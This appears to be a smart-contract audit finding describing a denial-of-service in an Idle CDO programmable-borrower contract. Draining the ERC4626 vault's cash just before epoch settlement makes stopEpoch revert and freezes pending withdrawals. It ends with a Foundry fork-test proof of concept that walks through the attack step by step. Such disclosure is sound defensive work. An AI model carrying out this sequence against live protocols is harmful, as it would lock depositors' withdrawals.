### Title
Transient ERC4626 illiquidity blocks epoch settlement and freezes pending withdrawals - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary

In programmable-borrower mode, an ordinary ERC4626 vault participant can withdraw the vault’s available underlying liquidity immediately before `stopEpoch`. If the vault’s share value still covers the withdrawal but its cash does not, `ProgrammableBorrower.onStopEpoch` reverts with `StopEpochVaultLiquidityUnavailable`, causing the entire epoch-settlement transaction to revert. [1](#0-0) [2](#0-1) 

### Finding Description

`IdleCDOEpochVariant` invokes `IProgrammableBorrower.onStopEpoch` without a surrounding `try`/`catch`, so the documented retryable liquidity revert prevents the later funding and epoch-completion logic from executing. [3](#0-2) 

The programmable borrower first checks its on-hand balance and then calls `vault.withdraw` for the missing amount only when the vault’s reported share value covers the shortfall. [4](#0-3) 

A covered-but-illiquid ERC4626 position makes `vault.withdraw` revert, which is converted into `StopEpochVaultLiquidityUnavailable` rather than a borrower default. [5](#0-4) 

Because programmable mode requires minted interest, the pulled amount is normally the pending withdrawal amount rather than expected interest. [6](#0-5) [7](#0-6) 

### Impact Explanation

An attacker holding enough ERC4626 vault shares can redeem the vault’s available cash after an epoch ends and repeatedly keep that cash unavailable whenever the manager retries settlement. [8](#0-7) 

This temporarily freezes pending withdrawal proceeds and epoch settlement because `claimWithdrawRequest` remains gated until `IdleCreditVault.epochNumber` is advanced by the successful stop flow. [9](#0-8) [10](#0-9) 

The measurable impact equals `pendingWithdraws`, plus any additional amount requested from the programmable borrower, because `onStopEpoch` is called with `_amountToPullFromBorrower + _pendingWithdraws`. [11](#0-10) 

### Likelihood Explanation

The attacker does not need to control the borrower, manager, owner, guardian, or strategy; they only need enough shares in the configured ERC4626 vault to consume its currently withdrawable liquidity. [12](#0-11) 

The vault share position can remain economically sufficient while the withdrawal itself is impossible, satisfying the branch that retries the external withdrawal rather than immediately reporting insufficient value. [1](#0-0) 

The manager can retry, but there is no fallback funding path in the CDO and the emergency redemption path also calls the same ERC4626 vault. [2](#0-1) [13](#0-12) 

### Recommendation

When `onStopEpoch` encounters covered-but-unavailable ERC4626 liquidity, route the stop through a bounded failed-settlement or borrower-default path instead of leaving the transaction permanently retryable. [5](#0-4) 

Alternatively, maintain settlement liquidity outside the ERC4626 vault for at least `epochPendingWithdraws`, since that amount is already tracked as reserved epoch-end liquidity. [14](#0-13) [15](#0-14) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";
import {IERC4626} from "../contracts/interfaces/IERC4626.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";
import {ProgrammableBorrower, StopEpochVaultLiquidityUnavailable} 
    from "../contracts/strategies/idle/ProgrammableBorrower.sol";

contract ProgrammableBorrowerVaultLiquidityDoSForkTest is Test {
    IdleCDOEpochVariant cdo = IdleCDOEpochVariant(vm.envAddress("CDO"));
    IdleCreditVault strategy = IdleCreditVault(cdo.strategy());
    ProgrammableBorrower borrower =
        ProgrammableBorrower(strategy.borrower());

    function testVaultLiquidityDrainBlocksStopEpoch() external {
        IERC4626 vault = IERC4626(borrower.vault());
        IERC20Detailed asset = IERC20Detailed(borrower.underlyingToken());
        address manager = strategy.manager();
        address liquidityWhale = vm.envAddress("VAULT_LIQUIDITY_WHALE");

        // Preconditions on the selected fork block:
        // - programmable-borrower mode is enabled;
        // - an epoch is active;
        // - at least one normal withdrawal is pending.
        require(cdo.isProgrammableBorrower(), "not programmable");
        require(cdo.isEpochRunning(), "epoch not running");
        uint256 pending = strategy.pendingWithdraws();
        require(pending != 0, "no pending withdrawal");

        vm.warp(cdo.epochEndDate());

        // The attacker is only an ERC4626 vault shareholder. They redeem enough
        // shares to consume the vault's available underlying balance.
        uint256 attackerShares = vault.balanceOf(liquidityWhale);
        uint256 attackerAssets = vault.convertToAssets(attackerShares);
        require(attackerAssets >= asset.balanceOf(address(vault)), "insufficient shares");

        vm.prank(liquidityWhale);
        vault.redeem(attackerShares, liquidityWhale, liquidityWhale);
        assertEq(asset.balanceOf(address(vault)), 0);

        // The borrower contract's shares still cover the pending withdrawal, so
        // the code takes the covered-liquidity branch and attempts vault.withdraw.
        uint256 borrowerShares = vault.balanceOf(address(borrower));
        require(vault.convertToAssets(borrowerShares) >= pending, "uncovered");

        // The external vault reverts from lack of cash and the hook bubbles up
        // StopEpochVaultLiquidityUnavailable, leaving the epoch unsettled.
        vm.expectRevert(StopEpochVaultLiquidityUnavailable.selector);
        vm.prank(manager);
        cdo.stopEpoch(0, 0);

        assertTrue(cdo.isEpochRunning(), "epoch unexpectedly settled");
        assertEq(strategy.pendingWithdraws(), pending, "pending withdrawals changed");
    }
}
```
